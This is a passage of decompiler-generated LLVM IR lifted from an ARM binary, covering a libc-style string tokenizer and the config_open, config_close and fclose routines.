  %v0_175f4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_175f4

dec_label_pc_1763c.loopexit:                      ; preds = %bb66, %dec_label_pc_17630
  %v0_1763c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1763c

dec_label_pc_1763c:                               ; preds = %dec_label_pc_17594, %dec_label_pc_1763c.loopexit
  %v0_1763c = phi i32 [ %v0_1763c.pre, %dec_label_pc_1763c.loopexit ], [ %v1_175a8, %dec_label_pc_17594 ]
  %v7_1763c = icmp eq i32 %v0_1763c, -1
  store i1 %v7_1763c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1763c, label %dec_label_pc_17784, label %dec_label_pc_17644

dec_label_pc_17644:                               ; preds = %dec_label_pc_1763c
  store i32 %v1_174ac, i32* %r3.global-to-local, align 4
  store i1 %v2_17648, i1* %cpsr_z.global-to-local, align 1
  %v0_1764c = load i32, i32* @r5, align 4
  %v1_1764c = add i32 %v0_1764c, 12
  %v2_1764c = inttoptr i32 %v1_1764c to i32*
  %v3_1764c = load i32, i32* %v2_1764c, align 4
  store i32 %v3_1764c, i32* @r4, align 4
  br i1 %v2_17648, label %dec_label_pc_17664, label %dec_label_pc_17654

dec_label_pc_17654:                               ; preds = %dec_label_pc_17644
  store i32 %v3_1764c, i32* @r0, align 4
  %v0_17658 = load i32, i32* @sl, align 4
  %v2_1765c = inttoptr i32 %v3_1764c to i8*
  %v3_1765c = call i32 @__GI_strspn(i8* %v2_1765c, i32 %v0_17658)
  store i32 %v3_1765c, i32* %r0.global-to-local, align 4
  %v0_17660 = load i32, i32* @r4, align 4
  %v2_17660 = add i32 %v0_17660, %v3_1765c
  store i32 %v2_17660, i32* @r4, align 4
  br label %dec_label_pc_17664

dec_label_pc_17664:                               ; preds = %dec_label_pc_17644, %dec_label_pc_17654
  %v0_17664 = phi i32 [ %v3_1764c, %dec_label_pc_17644 ], [ %v2_17660, %dec_label_pc_17654 ]
  %v1_17664 = inttoptr i32 %v0_17664 to i8*
  %v2_17664 = load i8, i8* %v1_17664, align 1
  %v3_17664 = zext i8 %v2_17664 to i32
  store i32 %v3_17664, i32* %r2.global-to-local, align 4
  %v2_17668 = icmp eq i8 %v2_17664, 0
  store i1 %v2_17668, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17668, label %dec_label_pc_174d4.backedge, label %dec_label_pc_17670

dec_label_pc_174d4.backedge:                      ; preds = %dec_label_pc_17664, %dec_label_pc_17670, %dec_label_pc_1777c
  %v0_174d4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_174d4

dec_label_pc_17670:                               ; preds = %dec_label_pc_17664
  %v0_17670 = load i32, i32* @r7, align 4
  %v1_17670 = inttoptr i32 %v0_17670 to i8*
  %v2_17670 = load i8, i8* %v1_17670, align 1
  %v3_17670 = zext i8 %v2_17670 to i32
  store i32 %v3_17670, i32* %r3.global-to-local, align 4
  %v9_17674 = icmp eq i8 %v2_17670, %v2_17664
  store i1 %v9_17674, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_17674, label %dec_label_pc_174d4.backedge, label %dec_label_pc_1767c

dec_label_pc_1767c:                               ; preds = %dec_label_pc_17670
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_17680 = load i32, i32* @r5, align 4
  %v1_17680 = add i32 %v0_17680, 4
  %v2_17680 = inttoptr i32 %v1_17680 to i32*
  %v3_17680 = load i32, i32* %v2_17680, align 4
  store i32 %v3_17680, i32* %r0.global-to-local, align 4
  %v0_17684 = load i32, i32* @fp, align 4
  store i32 %v3_17680, i32* %v1_176a0, align 4
  store i32 %v3_17498, i32* %r2.global-to-local, align 4
  %v3_17690 = inttoptr i32 %v3_17680 to i8*
  %v4_17690 = call i32 @__GI_memset(i8* %v3_17690, i32 %v0_17684, i32 %v3_17498)
  store i32 %v4_17690, i32* %r0.global-to-local, align 4
  %v0_17694 = load i32, i32* @fp, align 4
  store i32 %v0_17694, i32* @r6, align 4
  %v0_1775412 = load i32, i32* @r4, align 4
  %v1_1775413 = inttoptr i32 %v0_1775412 to i8*
  %v2_1775414 = load i8, i8* %v1_1775413, align 1
  %v3_1775415 = zext i8 %v2_1775414 to i32
  store i32 %v3_1775415, i32* %r2.global-to-local, align 4
  %v2_1775816 = icmp eq i8 %v2_1775414, 0
  store i1 %v2_1775816, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1775816, label %dec_label_pc_17770, label %dec_label_pc_17760

dec_label_pc_1769c:                               ; preds = %bb72
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_176a0 = load i32, i32* %v1_176a0, align 4
  store i32 %v2_176a0, i32* %r3.global-to-local, align 4
  store i32 %v1_174b0, i32* %r2.global-to-local, align 4
  %v9_176a8 = icmp eq i32 %v2_176ac, %v1_174b0
  store i1 %v9_176a8, i1* %cpsr_z.global-to-local, align 1
  %v5_176ac = mul i32 %v2_176ac, 4
  %v6_176ac = add i32 %v2_176a0, %v5_176ac
  %v7_176ac = inttoptr i32 %v6_176ac to i32*
  store i32 %v0_176ac, i32* %v7_176ac, align 4
  br i1 %v9_176a8, label %dec_label_pc_176b4, label %dec_label_pc_176c0

dec_label_pc_176b4:                               ; preds = %dec_label_pc_1769c
  store i32 %v1_174bc, i32* %r3.global-to-local, align 4
  store i1 %v2_176b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_176b8, label %dec_label_pc_176c0, label %dec_label_pc_176e0

dec_label_pc_176c0:                               ; preds = %dec_label_pc_176b4, %dec_label_pc_1769c
  %v0_176c0 = load i32, i32* @r7, align 4
  %v1_176c0 = inttoptr i32 %v0_176c0 to i8*
  %v2_176c0 = load i8, i8* %v1_176c0, align 1
  %v3_176c0 = zext i8 %v2_176c0 to i32
  store i32 %v3_176c0, i32* %r3.global-to-local, align 4
  %v2_176c4 = icmp eq i8 %v2_176c0, 0
  store i1 %v2_176c4, i1* %cpsr_z.global-to-local, align 1
  %v0_176c8 = load i32, i32* @r4, align 4
  store i32 %v0_176c8, i32* @r0, align 4
  %v1_176cc = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_176c4, i32 %v1_176cc, i32 %v0_176c0
  store i32 %storemerge, i32* @r1, align 4
  %v0_176d4 = call i32 @strcspn()
  store i32 %v0_176d4, i32* %r0.global-to-local, align 4
  %v0_176d8 = load i32, i32* @r4, align 4
  %v2_176d8 = add i32 %v0_176d8, %v0_176d4
  store i32 %v2_176d8, i32* @r4, align 4
  br label %dec_label_pc_17718

dec_label_pc_176e0:                               ; preds = %dec_label_pc_176b4
  %v0_176e0 = load i32, i32* @r4, align 4
  store i32 %v0_176e0, i32* @r0, align 4
  %v0_176e4 = load i32, i32* @r7, align 4
  %v1_176e4 = inttoptr i32 %v0_176e4 to i8*
  %v2_176e4 = load i8, i8* %v1_176e4, align 1
  %v3_176e4 = zext i8 %v2_176e4 to i32
  %v5_176e8 = call i32 @__GI_strchrnul(i32 %v0_176e0, i32 %v3_176e4, i32 %v1_174b0, i32 %v1_174bc)
  store i32 %v5_176e8, i32* %r0.global-to-local, align 4
  store i32 %v1_174ac, i32* %r2.global-to-local, align 4
  store i1 %v2_17648, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_176e8, i32* @r4, align 4
  br i1 %v2_17648, label %dec_label_pc_17718, label %dec_label_pc_17704

dec_label_pc_17700:                               ; preds = %dec_label_pc_17704
  %v1_17700 = add i32 %v0_17718.pre, -1
  store i32 %v1_17700, i32* @r4, align 4
  br label %dec_label_pc_17704

dec_label_pc_17704:                               ; preds = %dec_label_pc_176e0, %dec_label_pc_17700
  %v0_17704 = phi i32 [ %v1_17700, %dec_label_pc_17700 ], [ %v5_176e8, %dec_label_pc_176e0 ]
  %v1_17704 = add i32 %v0_17704, -1
  %v2_17704 = inttoptr i32 %v1_17704 to i8*
  %v3_17704 = load i8, i8* %v2_17704, align 1
  %v4_17704 = zext i8 %v3_17704 to i32
  %v0_17708 = load i32, i32* @sl, align 4
  store i32 %v0_17708, i32* @r0, align 4
  %v2_1770c = call i32 @__GI_strchr(i32 %v0_17708, i32 %v4_17704)
  store i32 %v2_1770c, i32* %r0.global-to-local, align 4
  %v2_17710 = icmp eq i32 %v2_1770c, 0
  store i1 %v2_17710, i1* %cpsr_z.global-to-local, align 1
  %v0_17718.pre = load i32, i32* @r4, align 4
  br i1 %v2_17710, label %dec_label_pc_17718, label %dec_label_pc_17700

dec_label_pc_17718:                               ; preds = %dec_label_pc_17704, %dec_label_pc_176e0, %dec_label_pc_176c0
  %v3_17724 = phi i32 [ %v5_176e8, %dec_label_pc_176e0 ], [ %v2_176d8, %dec_label_pc_176c0 ], [ %v0_17718.pre, %dec_label_pc_17704 ]
  %v1_17718 = inttoptr i32 %v3_17724 to i8*
  %v2_17718 = load i8, i8* %v1_17718, align 1
  %v3_17718 = zext i8 %v2_17718 to i32
  store i32 %v3_17718, i32* %r2.global-to-local, align 4
  %v0_1771c = load i32, i32* @r7, align 4
  %v1_1771c = inttoptr i32 %v0_1771c to i8*
  %v2_1771c = load i8, i8* %v1_1771c, align 1
  %v3_1771c = zext i8 %v2_1771c to i32
  store i32 %v3_1771c, i32* %r3.global-to-local, align 4
  %v9_17720 = icmp eq i8 %v2_1771c, %v2_17718
  store i1 %v9_17720, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_17720, label %bb69, label %dec_label_pc_1772c

bb69:                                             ; preds = %dec_label_pc_17718
  %v1_17724 = load i32, i32* @fp, align 4
  %v2_17724 = trunc i32 %v1_17724 to i8
  store i8 %v2_17724, i8* %v1_17718, align 1
  %v0_17728.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17728.pr, label %bb71, label %.dec_label_pc_1772c_crit_edge

.dec_label_pc_1772c_crit_edge:                    ; preds = %bb69
  %v0_1772c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1772c

dec_label_pc_1772c:                               ; preds = %.dec_label_pc_1772c_crit_edge, %dec_label_pc_17718
  %v0_1772c = phi i32 [ %v0_1772c.pre, %.dec_label_pc_1772c_crit_edge ], [ %v3_17718, %dec_label_pc_17718 ]
  %v2_1772c = icmp eq i32 %v0_1772c, 0
  store i1 %v2_1772c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1772c, label %bb71, label %bb70

bb70:                                             ; preds = %dec_label_pc_1772c
  %v1_17730 = load i32, i32* @fp, align 4
  %v2_17730 = trunc i32 %v1_17730 to i8
  %v3_17730 = load i32, i32* @r4, align 4
  %v4_17730 = inttoptr i32 %v3_17730 to i8*
  store i8 %v2_17730, i8* %v4_17730, align 1
  %v5_17730 = load i32, i32* @r4, align 4
  %v6_17730 = add i32 %v5_17730, 1
  store i32 %v6_17730, i32* @r4, align 4
  br label %bb71

bb71:                                             ; preds = %bb69, %dec_label_pc_1772c, %bb70
  %v2_17734 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_17734, i32* %r3.global-to-local, align 4
  %v2_17738 = icmp eq i32 %v2_17734, 0
  store i1 %v2_17738, i1* %cpsr_z.global-to-local, align 1
  %v0_17754.pre = load i32, i32* @r4, align 4
  br i1 %v2_17738, label %dec_label_pc_17750, label %dec_label_pc_17740

dec_label_pc_17740:                               ; preds = %bb71
  store i32 %v0_17754.pre, i32* @r0, align 4
  %v0_17744 = load i32, i32* @sl, align 4
  %v2_17748 = inttoptr i32 %v0_17754.pre to i8*
  %v3_17748 = call i32 @__GI_strspn(i8* %v2_17748, i32 %v0_17744)
  store i32 %v3_17748, i32* %r0.global-to-local, align 4
  %v0_1774c = load i32, i32* @r4, align 4
  %v2_1774c = add i32 %v0_1774c, %v3_17748
  store i32 %v2_1774c, i32* @r4, align 4
  br label %dec_label_pc_17750

dec_label_pc_17750:                               ; preds = %bb71, %dec_label_pc_17740
  %v0_17754 = phi i32 [ %v2_1774c, %dec_label_pc_17740 ], [ %v0_17754.pre, %bb71 ]
  %v0_17750 = load i32, i32* @r6, align 4
  %v1_17750 = add i32 %v0_17750, 1
  store i32 %v1_17750, i32* @r6, align 4
  %v1_17754 = inttoptr i32 %v0_17754 to i8*
  %v2_17754 = load i8, i8* %v1_17754, align 1
  %v3_17754 = zext i8 %v2_17754 to i32
  store i32 %v3_17754, i32* %r2.global-to-local, align 4
  %v2_17758 = icmp eq i8 %v2_17754, 0
  store i1 %v2_17758, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17758, label %dec_label_pc_17770, label %dec_label_pc_17760

dec_label_pc_17760:                               ; preds = %dec_label_pc_1767c, %dec_label_pc_17750
  %v0_176ac = phi i32 [ %v0_17754, %dec_label_pc_17750 ], [ %v0_1775412, %dec_label_pc_1767c ]
  %v2_176ac = phi i32 [ %v1_17750, %dec_label_pc_17750 ], [ %v0_17694, %dec_label_pc_1767c ]
  %v1_17764 = phi i32 [ %v3_17754, %dec_label_pc_17750 ], [ %v3_1775415, %dec_label_pc_1767c ]
  %v0_17760 = load i32, i32* @r7, align 4
  %v1_17760 = inttoptr i32 %v0_17760 to i8*
  %v2_17760 = load i8, i8* %v1_17760, align 1
  %v3_17760 = zext i8 %v2_17760 to i32
  store i32 %v3_17760, i32* %r3.global-to-local, align 4
  %v9_17764 = icmp eq i32 %v3_17760, %v1_17764
  store i1 %v9_17764, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_17764, label %dec_label_pc_17770, label %bb72

bb72:                                             ; preds = %dec_label_pc_17760
  %v2_17768 = load i32, i32* @sb, align 4
  %v3_17768 = sub i32 %v2_176ac, %v2_17768
  %v5_17768 = xor i32 %v2_17768, %v2_176ac
  %v6_17768 = xor i32 %v3_17768, %v2_176ac
  %v7_17768 = and i32 %v6_17768, %v5_17768
  %v8_17768 = icmp slt i32 %v7_17768, 0
  %v9_17768 = icmp slt i32 %v3_17768, 0
  %v10_17768 = icmp eq i32 %v2_176ac, %v2_17768
  store i1 %v10_17768, i1* %cpsr_z.global-to-local, align 1
  %v2_1776c = xor i1 %v9_17768, %v8_17768
  br i1 %v2_1776c, label %dec_label_pc_1769c, label %dec_label_pc_17770

dec_label_pc_17770:                               ; preds = %dec_label_pc_17760, %dec_label_pc_17750, %bb72, %dec_label_pc_1767c
  %v0_17774 = phi i32 [ %v0_17694, %dec_label_pc_1767c ], [ %v2_176ac, %dec_label_pc_17760 ], [ %v1_17750, %dec_label_pc_17750 ], [ %v2_176ac, %bb72 ]
  store i32 %v3_17494, i32* %r2.global-to-local, align 4
  %v9_17774 = icmp eq i32 %v0_17774, %v3_17494
  store i1 %v9_17774, i1* %cpsr_z.global-to-local, align 1
  %v6_17778 = icmp slt i32 %v0_17774, %v3_17494
  br i1 %v6_17778, label %dec_label_pc_1777c, label %dec_label_pc_17788

dec_label_pc_1777c:                               ; preds = %dec_label_pc_17770
  %v0_1777c = load i32, i32* @r8, align 4
  %v1_1777c = and i32 %v0_1777c, 1048576
  %v2_1777c = icmp eq i32 %v1_1777c, 0
  store i1 %v2_1777c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1777c, label %dec_label_pc_174d4.backedge, label %dec_label_pc_17784

dec_label_pc_17784:                               ; preds = %dec_label_pc_1777c, %dec_label_pc_1763c, %.thread, %entry
  br label %dec_label_pc_17788

dec_label_pc_17788:                               ; preds = %dec_label_pc_17770, %dec_label_pc_17558, %dec_label_pc_17784
  %v0_17788 = phi i32 [ %v0_17568, %dec_label_pc_17558 ], [ 0, %dec_label_pc_17784 ], [ %v0_17774, %dec_label_pc_17770 ]
  store i32 %v0_17788, i32* %r0.global-to-local, align 4
  store i32 %v3_17470, i32* @r4, align 4
  store i32 %v6_17470, i32* @r5, align 4
  store i32 %v9_17470, i32* @r6, align 4
  store i32 %v12_17470, i32* @r7, align 4
  store i32 %v15_17470, i32* @r8, align 4
  store i32 %v18_17470, i32* @sb, align 4
  store i32 %v21_17470, i32* @sl, align 4
  store i32 %v24_17470, i32* @fp, align 4
  ret i32 %v0_17788

; uselistorder directives
  uselistorder i32 %v0_17788, { 1, 0 }
  uselistorder i32 %v0_17774, { 0, 2, 1 }
  uselistorder i32 %v3_17768, { 1, 0 }
  uselistorder i32 %v2_17768, { 1, 0, 2 }
  uselistorder i32 %v2_176ac, { 0, 1, 7, 2, 3, 6, 5, 4 }
  uselistorder i32 %v0_17754.pre, { 0, 2, 1 }
  uselistorder i32 %v5_176e8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_17694, { 1, 0, 2 }
  uselistorder i1 %v9_17674, { 1, 0 }
  uselistorder i32 %v3_1764c, { 0, 2, 1, 3 }
  uselistorder i1 %v7_1763c, { 1, 0 }
  uselistorder i1 %v8_17634, { 1, 0 }
  uselistorder i32 %v3_17604, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_175f4, { 3, 2, 0, 1, 4, 5, 6, 7 }
  uselistorder i32 %v5_175dc, { 1, 0, 2 }
  uselistorder i32 %v1_175cc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_175b8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_175b0, { 1, 0 }
  uselistorder i32 %v1_1759c, { 1, 0 }
  uselistorder i32 %v1_17598, { 1, 0 }
  uselistorder i32 %v2_17574, { 1, 0 }
  uselistorder i32 %v1_17558, { 2, 0, 1 }
  uselistorder i32 %v0_17540, { 1, 0 }
  uselistorder i32 %v1_17530, { 0, 2, 1 }
  uselistorder i32* %v1_176a0, { 1, 0 }
  uselistorder i1 %v2_17648, { 1, 0, 2, 3 }
  uselistorder i32 %v1_174bc, { 2, 0, 1, 3 }
  uselistorder i32 %v1_174b0, { 2, 1, 0 }
  uselistorder i32 %v3_17498, { 1, 2, 0 }
  uselistorder i32 %v3_17494, { 2, 1, 0 }
  uselistorder i32 %v1_1748c, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 3, 4, 5, 6, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 27, 26, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 11, 12, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 32, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 1048576, { 2, 1, 3, 0 }
  uselistorder i32 (i8*)* @strlen, { 1, 0 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_17788, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17770, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_17760, { 1, 0 }
  uselistorder label %dec_label_pc_17750, { 1, 0 }
  uselistorder label %bb71, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17704, { 1, 0 }
  uselistorder label %dec_label_pc_174d4.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17664, { 1, 0 }
  uselistorder label %dec_label_pc_1763c, { 1, 0 }
  uselistorder label %dec_label_pc_17630, { 0, 2, 1 }
  uselistorder label %dec_label_pc_175f4, { 1, 0 }
  uselistorder label %dec_label_pc_17528, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_1779c = icmp eq i32* %arg1, null
  br i1 %v2_1779c, label %dec_label_pc_177c4, label %dec_label_pc_177a4

dec_label_pc_177a4:                               ; preds = %entry
  %v2_177a4 = load i32, i32* %arg1, align 4
  %v1_177a8 = inttoptr i32 %v2_177a4 to i16*
  %v2_177a8 = call i32 @__GI_fclose(i16* %v1_177a8)
  %v0_177ac = load i32, i32* @r4, align 4
  %v1_177ac = add i32 %v0_177ac, 20
  %v2_177ac = inttoptr i32 %v1_177ac to i32*
  %v3_177ac = load i32, i32* %v2_177ac, align 4
  %v2_177b0 = icmp eq i32 %v3_177ac, 0
  br i1 %v2_177b0, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_177a4
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_177a4, %bb
  store i32 96188, i32* @lr, align 4
  %v1_177b8 = xor i1 %v2_177b0, true
  call void @__pseudo_cond_branch(i1 %v1_177b8, i32 ptrtoint (i32* @global_var_1509c.29 to i32))
  %v0_177bc = load i32, i32* @r4, align 4
  store i32 %v0_177bc, i32* @r0, align 4
  %v0_177c0 = call i32 @free()
  br label %dec_label_pc_177c4

dec_label_pc_177c4:                               ; preds = %entry, %bb6
  %v1_177c8 = phi i32 [ 0, %entry ], [ %v0_177c0, %bb6 ]
  ret i32 %v1_177c8

; uselistorder directives
  uselistorder label %dec_label_pc_177c4, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_177d8 = load i32, i32* @r4, align 4
  store i32 %v3_177d8, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 -33972), i32* @r1, align 4
  %v0_177e0 = call i32 @__GI_fopen()
  store i32 %v0_177e0, i32* %r0.global-to-local, align 4
  store i32 %v0_177e0, i32* @r4, align 4
  %v2_177e4 = icmp eq i32 %v0_177e0, 0
  br i1 %v2_177e4, label %bb, label %dec_label_pc_177f0

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_177f0:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_177f8 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_177f8, i32* %r0.global-to-local, align 4
  %v2_177fc = icmp eq i32 %v2_177f8, 0
  br i1 %v2_177fc, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_177f0
  %v1_17800 = load i32, i32* @r4, align 4
  %v3_17800 = inttoptr i32 %v2_177f8 to i32*
  store i32 %v1_17800, i32* %v3_17800, align 4
  %v1_17808.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_177f0, %bb4
  %v1_17808 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_177f0 ], [ %v1_17808.pre, %bb4 ]
  %v2_17804 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17804, i32* @r4, align 4
  ret i32 %v1_17808

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 (i32, i32)* @calloc, { 36, 34, 35, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 1, 0, 4, 3, 2 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_17814 = load i32, i32* @r4, align 4
  store i32 %v3_17814, i32* %stack_var_-36, align 4
  %v6_17814 = load i32, i32* @r5, align 4
  %v9_17814 = load i32, i32* @r6, align 4
  %v12_17814 = load i32, i32* @r7, align 4
  %v2_17818 = add i32 %tmp, 52
  %v3_17818 = inttoptr i32 %v2_17818 to i32*
  %v4_17818 = load i32, i32* %v3_17818, align 4
  store i32 %v4_17818, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17820 = icmp eq i32 %v4_17818, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* @r8, align 4
  br i1 %v2_17820, label %dec_label_pc_17834, label %dec_label_pc_17898

dec_label_pc_17834:                               ; preds = %entry
  %v0_17834 = call i32 @__aeabi_read_tp()
  store i32 %v0_17834, i32* %r0.global-to-local, align 4
  %v0_17838 = load i32, i32* @r5, align 4
  %v1_17838 = add i32 %v0_17838, 64
  %v2_17838 = inttoptr i32 %v1_17838 to i32*
  %v3_17838 = load i32, i32* %v2_17838, align 4
  store i32 %v3_17838, i32* %r3.global-to-local, align 4
  %v1_1783c = add i32 %v0_17834, -1168
  store i32 %v1_1783c, i32* @r6, align 4
  %v3_17840 = icmp uge i32 %v3_17838, %v1_1783c
  store i1 %v3_17840, i1* %cpsr_c.global-to-local, align 1
  %v9_17840 = icmp eq i32 %v3_17838, %v1_1783c
  br i1 %v9_17840, label %dec_label_pc_1788c, label %dec_label_pc_17848

dec_label_pc_17848:                               ; preds = %dec_label_pc_17834
  %v1_17848 = add i32 %v0_17838, 56
  store i32 %v1_17848, i32* @r7, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v1_17848, i32* %r2.global-to-local, align 4
  %v0_17854 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_17854, i32* @r4, align 4
  %v1_17858115 = inttoptr i32 %v1_17848 to i32*
  %v2_17858116 = load i32, i32* %v1_17858115, align 4
  store i32 %v2_17858116, i32* %r3.global-to-local, align 4
  %v3_1785c118 = icmp uge i32 %v2_17858116, %v0_17854
  store i1 %v3_1785c118, i1* %cpsr_c.global-to-local, align 1
  %v9_1785c124 = icmp eq i32 %v2_17858116, %v0_17854
  br i1 %v9_1785c124, label %dec_label_pc_17864, label %dec_label_pc_1787c

dec_label_pc_17864:                               ; preds = %dec_label_pc_17848, %dec_label_pc_17864.dec_label_pc_17858_crit_edge
  %v0_17864125 = phi i32 [ %v1_1785c.pre, %dec_label_pc_17864.dec_label_pc_17858_crit_edge ], [ %v0_17854, %dec_label_pc_17848 ]
  store i32 %v0_17864125, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17874 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17874, label %dec_label_pc_17878, label %dec_label_pc_17864.dec_label_pc_17858_crit_edge

dec_label_pc_17864.dec_label_pc_17858_crit_edge:  ; preds = %dec_label_pc_17864
  %v0_17858.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1785c.pre = load i32, i32* @r4, align 4
  %v1_17858 = inttoptr i32 %v0_17858.pre to i32*
  %v2_17858 = load i32, i32* %v1_17858, align 4
  store i32 %v2_17858, i32* %r3.global-to-local, align 4
  %v3_1785c = icmp uge i32 %v2_17858, %v1_1785c.pre
  store i1 %v3_1785c, i1* %cpsr_c.global-to-local, align 1
  %v9_1785c = icmp eq i32 %v2_17858, %v1_1785c.pre
  br i1 %v9_1785c, label %dec_label_pc_17864, label %dec_label_pc_1787c

dec_label_pc_17878:                               ; preds = %dec_label_pc_17864
  %v0_17878 = load i32, i32* @r4, align 4
  store i32 %v0_17878, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1787c

dec_label_pc_1787c:                               ; preds = %dec_label_pc_17848, %dec_label_pc_17864.dec_label_pc_17858_crit_edge, %dec_label_pc_17878
  %v0_1787c = phi i32 [ %v0_17878, %dec_label_pc_17878 ], [ %v2_17858116, %dec_label_pc_17848 ], [ %v2_17858, %dec_label_pc_17864.dec_label_pc_17858_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1787c = icmp eq i32 %v0_1787c, 0
  br i1 %v2_1787c, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_1787c
  %v1_17880 = load i32, i32* @r7, align 4
  store i32 %v1_17880, i32* %r0.global-to-local, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_1787c, %bb
  %v1_17884 = xor i1 %v2_1787c, true
  call void @__pseudo_cond_branch(i1 %v1_17884, i32 ptrtoint (i32* @global_var_16040.925 to i32))
  %v0_17888 = load i32, i32* @r6, align 4
  %v1_17888 = load i32, i32* @r5, align 4
  %v2_17888 = add i32 %v1_17888, 64
  %v3_17888 = inttoptr i32 %v2_17888 to i32*
  store i32 %v0_17888, i32* %v3_17888, align 4
  %v0_1788c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1788c

dec_label_pc_1788c:                               ; preds = %dec_label_pc_17834, %bb41
  %v0_1788c = phi i32 [ %v0_17838, %dec_label_pc_17834 ], [ %v0_1788c.pre, %bb41 ]
  %v1_1788c = add i32 %v0_1788c, 60
  %v2_1788c = inttoptr i32 %v1_1788c to i32*
  %v3_1788c = load i32, i32* %v2_1788c, align 4
  %v1_17890 = add i32 %v3_1788c, 1
  store i32 %v1_17890, i32* %r3.global-to-local, align 4
  store i32 %v1_17890, i32* %v2_1788c, align 4
  %v0_17898.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17898

dec_label_pc_17898:                               ; preds = %entry, %dec_label_pc_1788c
  %v1_178a0 = phi i32 [ %tmp, %entry ], [ %v0_17898.pre, %dec_label_pc_1788c ]
  %v1_17898 = inttoptr i32 %v1_178a0 to i16*
  %v2_17898 = load i16, i16* %v1_17898, align 2
